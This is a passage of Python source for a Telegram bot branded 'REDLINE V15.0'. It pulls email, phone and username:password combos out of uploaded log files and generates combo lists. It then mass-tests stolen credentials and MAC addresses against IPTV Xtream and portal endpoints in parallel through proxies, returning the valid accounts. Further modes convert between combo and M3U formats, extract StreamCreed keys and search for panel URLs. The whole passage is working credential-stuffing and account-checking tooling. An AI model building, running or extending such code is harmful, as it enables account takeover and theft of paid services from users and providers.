        if not host.startswith(('http://', 'https://')):
            host = 'http://' + host
        
        context.user_data['host'] = host.rstrip('/')
        context.user_data['step'] = 'await_file'
        await update.message.reply_html(
            f"✅ <b>Host saved!</b>\n"
            f"<code>{host}</code>\n\n"
            f"📤 <b>Now send a file containing:</b>\n"
            f"• MAC addresses (one per line)\n"
            f"• Format: <code>00:1A:79:XX:XX:XX</code>\n"
            f"• Both colon and dash separators supported\n\n"
            f"⏳ Waiting for file..."
        )
        return

    # PHASE 3: Combo Generator
    if mode == 'combo_generator':
        spec = (update.message.text or '').strip()
        parts = [p.strip() for p in spec.split(',')]
        if len(parts) != 4:
            await update.message.reply_html("❌ <b>Invalid format</b><br>Use: <code>prefix,password,start,end</code>")
            return
        prefix, password, s, e = parts
        try:
            start = int(s); end = int(e)
            if end < start or end - start > 2000:
                await update.message.reply_html("❌ <b>Range too large</b> (max 2000)")
                return
        except Exception:
            await update.message.reply_html("❌ <b>Invalid numbers</b>")
            return
        combos = [f"{prefix}{i}:{password}" for i in range(start, end+1)]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_filename = f"COMBO_GENERATOR_{timestamp}.txt"
        result_path = os.path.join(TEMP_DIR, result_filename)
        with open(result_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(combos))
        with open(result_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=result_filename,
                caption=(
                    f"✅ <b>Combos Generated</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 Total: {len(combos):,}"
                ),
                parse_mode='HTML',
                reply_markup=get_main_menu()
            )
        os.remove(result_path)
        context.user_data.clear()
        return
    # === Phase 3: U:P Xtream Single ===
    if data == "up_xtream_single":
        context.user_data.clear()
        context.user_data['mode'] = 'up_xtream_single'
        context.user_data['step'] = 'ask_host'
        await query.edit_message_text(
            "<b>⚡ U:P Xtream Check (Single)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send IPTV host (with port). Example: <code>http://example.com:8080</code>",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 3: M3U Manual ===
    if data == "m3u_manual":
        context.user_data.clear()
        context.user_data['mode'] = 'm3u_manual'
        await query.edit_message_text(
            "<b>🔍 M3U Manual Check</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send a single M3U URL to test",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 3: MAC → M3U (interactive) ===
    if data == "mac_to_m3u":
        context.user_data.clear()
        context.user_data['mode'] = 'mac_to_m3u'
        context.user_data['step'] = 'ask_host'
        await query.edit_message_text(
            "<b>↩️ MAC → M3U</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send IPTV host (with port). Example: <code>http://example.com:8080</code>",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 3: MAC Host Single ===
    if data == "mac_host_single":
        context.user_data.clear()
        context.user_data['mode'] = 'mac_host_single'
        context.user_data['step'] = 'ask_host'
        await query.edit_message_text(
            "<b>📱 MAC Host Check (Single)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send IPTV host (with port). Example: <code>http://example.com:8080</code>",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 3: Combo Generator ===
    if data == "combo_generator":
        context.user_data.clear()
        context.user_data['mode'] = 'combo_generator'
        await query.edit_message_text(
            "<b>🧪 Combo Generator</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send input in format: <code>prefix,password,start,end</code>\n"
            "Example: <code>user,pass,1,100</code> → user1:pass ... user100:pass",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # PHASE 2: WHOIS (text input)
    if mode == 'whois_lookup':
        target = update.message.text.strip()
        status_msg = await update.message.reply_html("⏳ <b>Running WHOIS...</b>")
        tgt, report = WHOISLookup.whois_report(target)
        
        # === AI TRUST ANALYSIS ===
        ai_analysis = ""
        if ai_assistant.enabled:
            await status_msg.edit_text(
                "⏳ <b>Running WHOIS...</b>\n"
                "🤖 AI analyzing domain trust...",
                parse_mode='HTML'
            )
            try:
                ai_result = await ai_assistant.analyze_whois(report, tgt)
                if ai_result:
                    ai_analysis = f"\n\n{ai_result}"
            except Exception:
                pass
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_filename = f"WHOIS_{timestamp}.txt"
        result_path = os.path.join(TEMP_DIR, result_filename)
        with open(result_path, 'w', encoding='utf-8') as f:
            f.write(report + "\n")
            # Append AI analysis to file if available
            if ai_analysis:
                f.write("\n" + "="*60 + "\n")
                f.write(ai_analysis.replace("🤖 AI Trust Analysis:\n", "🤖 AI TRUST ANALYSIS\n"))
                f.write("\n" + "="*60 + "\n")
        
        # Build caption with AI insights
        caption = (
            f"✅ <b>WHOIS Complete</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 Target: <code>{tgt}</code>"
        )
        
        # Add AI analysis if available (max 200 chars for caption)
        if ai_analysis and len(ai_analysis) < 800:
            caption += ai_analysis
        elif ai_analysis:
            # Too long, show preview
            caption += "\n\n🤖 AI analysis in file"
        
        with open(result_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=result_filename,
                caption=caption,
                parse_mode='HTML',
                reply_markup=get_main_menu()
            )
        await status_msg.delete()
        os.remove(result_path)
        context.user_data.clear()
        return

    # PHASE 2: KEYWORD SEARCHER (keywords after file)
    if mode == 'keyword_searcher' and 'search_text' in context.user_data:
        kw_line = update.message.text or ''
        keywords = [k.strip() for k in kw_line.split(',') if k.strip()]
        if not keywords:
            await update.message.reply_html("❌ <b>No keywords provided</b>")
            return
        results = KeywordSearcher.search(context.user_data['search_text'], keywords)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_filename = f"KEYWORD_SEARCH_{timestamp}.txt"
        result_path = os.path.join(TEMP_DIR, result_filename)
        with open(result_path, 'w', encoding='utf-8') as f:
            f.write(f"# Keyword Search Results\n")
            f.write(f"# Keywords: {', '.join(keywords)}\n\n")
            if not results:
                f.write("No matches found\n")
            else:
                for kw, lines in results.items():
                    f.write(f"# === {kw} ({len(lines)}) ===\n")
                    for ln in lines:
                        f.write(ln + "\n")
                    f.write("\n")
        with open(result_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=result_filename,
                caption=(
                    f"✅ <b>Keyword Search Complete</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🔎 Keywords: {len(keywords)}"
                ),
                parse_mode='HTML',
                reply_markup=get_main_menu()
            )
        os.remove(result_path)
        context.user_data.clear()
        return
    
    # Mode selection for extractions
    if data.startswith("mode_"):
        mode = data.replace("mode_", "")
        context.user_data['mode'] = mode
        context.user_data['action'] = 'extract'
        
        mode_info = {
            'np': ('📱 N:P (Phone:Password)', 'Extract phone numbers with passwords'),
            'up': ('👤 U:P (Username:Password)', 'Extract usernames with passwords (no emails)'),
            'mp': ('📧 M:P (Email:Password)', 'Extract emails with passwords'),
            'm3u': ('🔗 M3U Links', 'Extract M3U and M3U8 links (Xtream API)'),
            'mac': ('🔑 MAC:KEY', 'Extract MAC addresses with keys'),
            'all': ('⭐ Extract ALL', 'Extract all combo types at once')
        }
        
        title, description = mode_info.get(mode, ('Unknown', 'Unknown'))
        
        text = (
            f"<b>{title}</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📝 {description}\n\n"
            "📤 <b>Send your file now:</b>\n"
            "• Supported: .txt, .log files\n"
            "• Multiple files allowed\n"
            "• Instant processing!\n\n"
            "⏳ Waiting for file..."
        )
        
        await query.edit_message_text(
            text,
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
    
    
    # M3U Checker
    if data == "check_m3u":
        context.user_data['mode'] = 'check_m3u'
        context.user_data['action'] = 'check'
        text = (
            "✅ <b>M3U Link Checker</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔍 Check M3U links for validity (Live validation)\n\n"
            "📤 <b>Send a file containing:</b>\n"
            "• M3U links (one per line)\n"
            "• Xtream API URLs\n"
            "• M3U8 links\n\n"
            "⚡ <b>Features:</b>\n"
            "• Multi-threaded checking (super fast!)\n"
            "• Supports up to 1000 links\n"
            "• Detailed results (ALIVE/DEAD/ERROR)\n\n"
            "⏳ Send your M3U file..."
        )
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=get_back_button())
    
    # M3U to Combo
    elif data == "m3u_to_combo":
        context.user_data['mode'] = 'm3u_to_combo'
        context.user_data['action'] = 'convert'
        text = (
            "🔄 <b>M3U → Combo Converter</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔀 Convert M3U links to username:password format\n\n"
            "📤 <b>Send M3U file containing:</b>\n"
            "• Xtream API URLs\n"
            "• get.php links with username/password\n\n"
            "✨ <b>Bot will extract:</b>\n"
            "• username:password from each link\n"
            "• Auto-cleanup and deduplicate\n"
            "• Sorted results\n\n"
            "⏳ Send your M3U file..."
        )
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=get_back_button())
    
    # Combo to M3U
    elif data == "combo_to_m3u":
        context.user_data['mode'] = 'combo_to_m3u'
        context.user_data['action'] = 'convert'
        text = (
            "🔄 <b>Combo → M3U Converter</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔀 Convert username:password to M3U format\n\n"
            "📤 <b>Step 1: Send combo file</b>\n"
            "• username:password format\n"
            "• One combo per line\n\n"
            "📝 <b>Step 2: Send Base URL</b> (next message)\n"
            "• Example: http://example.com:8080\n"
            "• Bot adds /get.php?username=...&password=...\n\n"
            "⏳ Send your combo file first..."
        )
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=get_back_button())
    
    # Back to menu
    elif data == "back":
        welcome_text = (
            "🔥 <b>REDLINE V15.0 - Enhanced Bot</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Select an option:"
        )
        await query.edit_message_text(
            welcome_text,
            parse_mode='HTML',
            reply_markup=get_main_menu()
        )
    
    # Help
    elif data == "help":
        help_text = (
            "📖 <b>User Guide</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "<b>How to use:</b>\n\n"
            "1️⃣ <b>Select extraction type</b>\n"
            "   • N:P for phone numbers\n"
            "   • U:P for usernames\n"
            "   • M:P for emails\n"
            "   • M3U for links\n"
            "   • MAC:KEY for MAC addresses\n"
            "   • ALL to extract everything\n\n"
            "2️⃣ <b>Send your log file</b>\n"
            "   • .txt or .log format\n"
            "   • Multiple files allowed\n\n"
            "3️⃣ <b>Receive results</b>\n"
            "   • Clean text file ready to use\n"
            "   • With hit count\n\n"
            "⚡ Processing is instant!\n"
            "🔒 Privacy: Files deleted after processing"
        )
        await query.edit_message_text(
            help_text,
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
    
    # Stats
    elif data == "stats":
        stats_text = (
            "📊 <b>Bot Statistics</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 User: {query.from_user.mention_html()}\n"
            f"🆔 ID: <code>{query.from_user.id}</code>\n\n"
            "🔥 <b>REDLINE V15.0 Enhanced</b>\n"
            "⚡ Version: 2.0\n"
            "🤖 Status: Online\n"
            "🛠️ Tier 1 Features: Active\n\n"
            "✨ Ready to use!"
        )
        await query.edit_message_text(
            stats_text,
            parse_mode='HTML',
            reply_markup=get_back_button()
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads and process extraction - ALL ENGLISH"""
    mode = context.user_data.get('mode')
    action = context.user_data.get('action', 'extract')
    
    if not mode:
        await update.message.reply_text(
            "⚠️ Please select an option first\n"
            "Use /redline to show menu"
        )
        return
    
    # Check file size
    file_size = update.message.document.file_size
    if file_size > MAX_FILE_SIZE:
        await update.message.reply_text(
            f"❌ <b>File too large!</b>\n\n"
            f"📊 <b>Limits:</b>\n"
            f"• Max file size: <code>{format_file_size(MAX_FILE_SIZE)}</code>\n"
            f"• Max lines: <code>{format_number(MAX_LINES)}</code>\n\n"
            f"📁 <b>Your file:</b> <code>{format_file_size(file_size)}</code>\n\n"
            f"💡 <b>Tips:</b>\n"
            f"• Split large files into smaller chunks\n"
            f"• Remove duplicate lines first\n"
            f"• Use compression (gzip) if possible\n\n"
            f"<i>Limits protect server resources on Koyeb</i>",
            parse_mode='HTML'
        )
        return
    
    # Show processing message
    status_msg = await update.message.reply_text(
        "⏳ <b>Processing...</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📥 Downloading file...",
        parse_mode='HTML'
    )
    
    try:
        # Download file
        file = await update.message.document.get_file()
        file_path = os.path.join(TEMP_DIR, f"{update.effective_user.id}_{file.file_id}.txt")
        await file.download_to_drive(file_path)
        
        # Check line count (memory protection)
        line_count = count_lines_efficient(file_path, MAX_LINES + 1)
        if line_count > MAX_LINES:
            await status_msg.edit_text(
                f"❌ <b>Too many lines!</b>\n\n"
                f"📊 <b>Limits:</b>\n"
                f"• Max lines: <code>{format_number(MAX_LINES)}</code>\n"
                f"• Your file: <code>{format_number(line_count)}+</code>\n\n"
                f"💡 <b>Solution:</b>\n"
                f"• Split file into {(line_count // MAX_LINES) + 1} parts\n"
                f"• Remove empty lines\n"
                f"• Process in batches\n\n"
                f"<i>This protects against memory exhaustion</i>",
                parse_mode='HTML'
            )
            os.remove(file_path)
            context.user_data.clear()
            return
        
        # Update status
        await status_msg.edit_text(
            f"⏳ <b>Processing...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📄 Reading {format_number(line_count)} lines...",
            parse_mode='HTML'
        )
        
        # Read file content (memory-safe)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            text = f.read()
        
        # === HANDLE AI FILE ANALYSIS ===
        if mode == 'ai_analyze':
            if not ai_assistant.enabled:
                await status_msg.edit_text(
                    "❌ <b>AI not available</b>\n\n"
                    "Set GEMINI_API_KEY environment variable to enable AI features.",
                    parse_mode='HTML'
                )
                os.remove(file_path)
                context.user_data.clear()
                return
            
            await status_msg.edit_text(
                "🤖 <b>AI is analyzing your file...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🧠 This may take a few seconds...",
                parse_mode='HTML'
            )
            
            # Get AI analysis
            analysis = await ai_assistant.analyze_file(text, "combo file")
            
            # Send analysis result
            await update.message.reply_html(
                f"🤖 <b>AI Analysis Results:</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{analysis}\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 File: {line_count} lines",
                reply_markup=get_main_menu()
            )
            
            await status_msg.delete()
            os.remove(file_path)
            context.user_data.clear()
            return
        
        # === HANDLE U:P XTREAM AUTO (batch) ===
        if mode == 'up_xtream_auto' and context.user_data.get('step') == 'await_file':
            await status_msg.edit_text(
                "⏳ <b>Probing Xtream Accounts...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔍 player_api.php",
                parse_mode='HTML'
            )
            host = context.user_data.get('host') or ''
            combos_raw = [ln.strip() for ln in text.split('\n') if ':' in ln]
            combos = []
            for ln in combos_raw:
                u, p = ln.split(':', 1)
                if u and p:
                    combos.append((u.strip(), p.strip()))
            if not combos:
                await status_msg.edit_text("❌ <b>No combos found!</b>", parse_mode='HTML')
                os.remove(file_path)
                context.user_data.clear()
                return
            limit = int(GLOBAL_SETTINGS.get('combo_limit', 500))
            combos = combos[:limit]
            workers = int(GLOBAL_SETTINGS.get('workers', 12))
            include_ch = bool(GLOBAL_SETTINGS.get('include_channels_auto'))
            done = 0
            found = 0
            total = len(combos)
            blocks: List[str] = []
            
            # Initialize ProgressTracker
            progress = ProgressTracker(status_msg, total, "Probing Xtream Accounts")
            
            # show typing while processing
            try:
                await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
            except Exception:
                pass
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = {ex.submit(UpProbe.probe_up, host, u, p, 8, get_proxies()): (u, p) for (u, p) in combos}
                for fu in as_completed(futs):
                    ok, info, err = fu.result()
                    done += 1
                    if ok:
                        if include_ch:
                            try:
                                ch = M3UProbe.fetch_first_group(info.get('m3u',''), timeout=3, proxies=get_proxies(), max_kb=64)
                                if ch:
                                    info['channels'] = ch
                            except Exception:
                                pass
                        blocks.append(M3UProbe.format_auto_block(info))
                        found += 1
                    
                    # Update progress
                    if done % 10 == 0 or done == total:
                        await progress.update(done)
            
            # Complete progress
            await progress.complete(f"\n✅ Valid: {found}/{total}")
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"UP_XTREAM_INFO_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                if blocks:
                    f.write("\n".join(blocks) + "\n")
                else:
                    f.write("# No valid accounts\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>U:P Xtream Auto Complete</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Valid: {len(blocks)} / {len(combos)}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(file_path)
            os.remove(result_path)
            context.user_data.clear()
            return
        
        # === HANDLE MAC SCANNER (batch) ===
        if mode == 'mac_scanner' and context.user_data.get('step') == 'await_file':
            await status_msg.edit_text(
                "⏳ <b>Scanning MAC Addresses...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔍 Testing portal endpoints...",
                parse_mode='HTML'
            )
            
            host = context.user_data.get('host') or ''
            
            # Extract MAC addresses from file
            macs_raw = [ln.strip() for ln in text.split('\n') if ln.strip()]
            macs = []
            
            # Validate MAC format (support both colon and dash separators)
            mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
            for mac in macs_raw:
                mac = mac.upper()
                if mac_pattern.match(mac):
                    # Normalize to colon separator
                    mac = mac.replace('-', ':')
                    macs.append(mac)
            
            if not macs:
                await status_msg.edit_text("❌ <b>No valid MAC addresses found!</b>", parse_mode='HTML')
                os.remove(file_path)
                context.user_data.clear()
                return
            
            # Apply limit
            limit = int(GLOBAL_SETTINGS.get('combo_limit', 500))
            macs = macs[:limit]
            workers = int(GLOBAL_SETTINGS.get('workers', 12))
            
            done = 0
            found = 0
            total = len(macs)
            blocks: List[str] = []
            
            # Initialize ProgressTracker
            progress = ProgressTracker(status_msg, total, "Scanning MAC Addresses")
            
            # Show typing
            try:
                await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
            except Exception:
                pass
            
            # Probe MACs in parallel
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = {ex.submit(MACProbe.probe_mac, host, mac, 8, get_proxies()): mac for mac in macs}
                for fu in as_completed(futs):
                    ok, info, err = fu.result()
                    done += 1
                    if ok:
                        blocks.append(MACProbe.format_mac_result(info))
                        found += 1
                    
                    # Update progress
                    if done % 10 == 0 or done == total:
                        await progress.update(done)
            
            # Complete progress
            await progress.complete(f"\n✅ Valid: {found}/{total}")
            
            # Create result file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"MAC_SCANNER_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            
            with open(result_path, 'w', encoding='utf-8') as f:
                if blocks:
                    f.write(f"# MAC Scanner Results\n")
                    f.write(f"# Host: {host}\n")
                    f.write(f"# Valid MACs: {found} / {total}\n")
                    f.write(f"# Scanned: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    f.write("\n".join(blocks) + "\n")
                else:
                    f.write("# No valid MAC addresses found\n")
            
            # Send result
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>MAC Scanner Complete</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"🎯 Host: <code>{host}</code>\n"
                        f"📊 Valid: {found} / {total}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            
            await status_msg.delete()
            os.remove(result_path)
            os.remove(file_path)
            context.user_data.clear()
            return
        
        # === HANDLE M3U LINK CHECKER (AUTO, REDLINE info) ===
        if mode == 'check_m3u':
            await status_msg.edit_text(
                "⏳ <b>Starting M3U Probe...</b>",
                parse_mode='HTML'
            )
            links = [line.strip() for line in text.split('\n') if line.strip().startswith(('http://','https://'))]
            if not links:
                await status_msg.edit_text("❌ <b>No M3U links found!</b>", parse_mode='HTML')
                os.remove(file_path)
                context.user_data.clear()
                return
            limit = int(GLOBAL_SETTINGS.get('m3u_limit', 1000))
            links = links[:limit]
            workers = int(GLOBAL_SETTINGS.get('workers', 12))
            include_ch = bool(GLOBAL_SETTINGS.get('include_channels_auto'))
            done = 0
            found = 0
            total = len(links)
            blocks: List[str] = []
            
            # Initialize ProgressTracker
            progress = ProgressTracker(status_msg, total, "Probing M3U Links")
            
            # show typing while processing
            try:
                await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
            except Exception:
                pass
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = {ex.submit(M3UProbe.probe, u, 8, get_proxies()): u for u in links}
                for fu in as_completed(futs):
                    ok, info, err = fu.result()
                    done += 1
                    if ok:
                        if include_ch:
                            try:
                                ch = M3UProbe.fetch_first_group(info.get('m3u',''), timeout=3, proxies=get_proxies(), max_kb=64)
                                if ch:
                                    info['channels'] = ch
                            except Exception:
                                pass
                        blocks.append(M3UProbe.format_auto_block(info))
                        found += 1
                    
                    # Update progress
                    if done % 10 == 0 or done == total:
                        await progress.update(done)
            
            # Complete progress
            await progress.complete(f"\n✅ Valid: {found}/{total}")
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"M3U_INFO_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                if blocks:
                    f.write("\n".join(blocks) + "\n")
                else:
                    f.write("# No valid accounts\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>M3U Auto Complete</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Valid: {len(blocks)} / {len(links)}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(file_path)
            os.remove(result_path)
            context.user_data.clear()
            return

        # === PHASE 2: KEYWORD SEARCHER (file first) ===
        elif mode == 'keyword_searcher':
            # store file content and ask for keywords
            context.user_data['search_text'] = text
            await status_msg.edit_text(
                "✅ <b>File received!</b>\n\n"
                "📝 Now send <b>keywords</b> (comma separated)\n\n"
                "Example: <code>login, password, xtream, player_api</code>",
                parse_mode='HTML'
            )
            os.remove(file_path)
            return

        # === PHASE 2: STREAMCREED FINDER ===
        elif mode == 'streamcreed_finder':
            keys = StreamCreedFinder.find(text)
            if not keys:
                await status_msg.edit_text(
                    "❌ <b>No keys found!</b>",
                    parse_mode='HTML'
                )
                os.remove(file_path)
                context.user_data.clear()
                return
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"STREAMCREED_KEYS_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write(f"# StreamCreed Keys\n# Found: {len(keys)}\n\n")
                for k in sorted(keys):
                    f.write(k + "\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>Keys Found!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"🔑 Total: {len(keys):,}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(file_path)
            os.remove(result_path)
            context.user_data.clear()
            return
        
        # === HANDLE M3U TO COMBO CONVERTER ===
        elif mode == 'm3u_to_combo':
            await status_msg.edit_text(
                "⏳ <b>Converting M3U→Combo...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔄 Extracting credentials...",
                parse_mode='HTML'
            )
            
            results = M3UConverter.m3u_to_combo(text)
            
            if not results:
                await status_msg.edit_text(
                    "❌ <b>No credentials found!</b>\n\n"
                    "Make sure M3U links contain username/password",
                    parse_mode='HTML'
                )
                os.remove(file_path)
                context.user_data.clear()
                return
            
            # Create result file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"M3U_TO_COMBO_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write(f"# M3U to Combo Conversion\n")
                f.write(f"# Converted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Total Combos: {len(results)}\n")
                f.write("#" + "="*50 + "\n\n")
                f.write('\n'.join(sorted(results)))
            
            # Send result
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>M3U→Combo Complete!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Extracted: {len(results):,} combos\n"
                        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            
            await status_msg.delete()
            os.remove(file_path)
            os.remove(result_path)
            context.user_data.clear()
            return
        
        # === HANDLE COMBO TO M3U CONVERTER ===
        elif mode == 'combo_to_m3u':
            # Check if we have combo data stored
            if 'combo_data' not in context.user_data:
                # First file upload - store combo data
                context.user_data['combo_data'] = text
                os.remove(file_path)
                
                await status_msg.edit_text(
                    "✅ <b>Combo file received!</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "📝 Now send the <b>Base URL</b>\n\n"
                    "<b>Example:</b>\n"
                    "<code>http://example.com:8080</code>\n\n"
                    "⚡ Bot will create M3U links like:\n"
                    "<code>http://example.com:8080/get.php?username=XXX&password=YYY&type=m3u_plus</code>",
                    parse_mode='HTML'
                )
                return
            else:
                # This shouldn't happen but handle it
                await status_msg.edit_text(
                    "⚠️ <b>Please send Base URL as text message</b>\n\n"
                    "Not as a file!",
                    parse_mode='HTML'
                )
                os.remove(file_path)
                return
        
        # === HANDLE M3U TO MAC CONVERTER (file input) ===
        elif mode == 'm3u_to_mac':
            await status_msg.edit_text(
                "⏳ <b>Converting M3U→MAC...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔄 Extracting stream IDs...",
                parse_mode='HTML'
            )
            mac_urls = MACConverter.m3u_to_mac(text)
            if not mac_urls:
                await status_msg.edit_text(
                    "❌ <b>No valid M3U links found!</b>",
                    parse_mode='HTML'
                )
                os.remove(file_path)
                context.user_data.clear()
                return
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"M3U_TO_MAC_{timestamp}.m3u"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write('#EXTM3U\n')
                for url in sorted(mac_urls):
                    f.write(f"{url}\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>M3U→MAC Complete!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 URLs: {len(mac_urls):,}\n"
                        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(file_path)
            os.remove(result_path)
            context.user_data.clear()
            return

        # === HANDLE PANEL SEARCHER ===
        elif mode == 'panel_searcher':
            await status_msg.edit_text(
                "⏳ <b>Searching panels...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔎 Detecting IPTV/XUI endpoints...",
                parse_mode='HTML'
            )
            panels = PanelSearcher.find(text)
            if not panels:
                await status_msg.edit_text(
                    "❌ <b>No panel URLs found!</b>",
                    parse_mode='HTML'
                )
                os.remove(file_path)
                context.user_data.clear()
                return
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"PANEL_SEARCH_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write(f"# Logs Panel Searcher\n")
                f.write(f"# Found: {len(panels)}\n")
                f.write("#" + "="*50 + "\n\n")
                for u in sorted(panels):
                    f.write(u + "\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>Panel Search Complete!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Found: {len(panels):,} panels"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(file_path)
